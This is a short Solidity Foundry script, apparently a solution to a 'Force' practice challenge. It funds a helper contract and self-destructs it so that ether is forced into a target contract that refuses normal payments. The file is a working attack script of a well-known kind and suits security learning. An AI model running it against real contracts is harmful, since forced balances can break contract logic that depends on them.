// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {Force, SelfDestruct} from "../../src/Force.sol";

contract AddBalanceForce is Script {
    SelfDestruct selfDestruct;

    function addBalanceForce(address forceContract) public {
        vm.startBroadcast();
        selfDestruct = new SelfDestruct();
        (bool success,) = address(selfDestruct).call{value: 0.0001 ether}("");
        require(success, "Fail Call");
        selfDestruct.destroyContract(payable(forceContract));
        vm.stopBroadcast();
    }

    function run(address forceContract) external {
        addBalanceForce(forceContract);
    }
}
